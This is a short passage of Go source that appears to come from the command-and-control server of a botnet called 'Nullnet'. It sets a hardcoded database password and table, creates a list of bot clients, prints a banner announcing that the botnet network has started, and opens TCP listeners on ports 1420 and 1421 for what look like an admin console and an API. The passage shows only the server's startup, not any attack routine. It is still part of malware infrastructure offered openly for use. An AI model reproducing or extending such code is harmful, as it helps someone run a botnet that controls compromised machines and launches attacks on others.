...
const DatabasePass string = "13121312!"
const DatabaseTable string = "vox1312"

var clientList *ClientList = NewClientList()
var database *Database = NewDatabase(DatabaseAddr, DatabaseUser, DatabasePass, DatabaseTable)

func main() {
	fmt.Println("\x1b[37m[\x1b[0;90mNullnet Botnet Network Started!\x1b[37m]")
	tel, err := net.Listen("tcp", "0.0.0.0:1420")
	if err != nil {
		fmt.Println(err)
		return
	}
	api, err := net.Listen("tcp", "0.0.0.0:1421")
	if err != nil {
		fmt.Println(err)
		return
	}
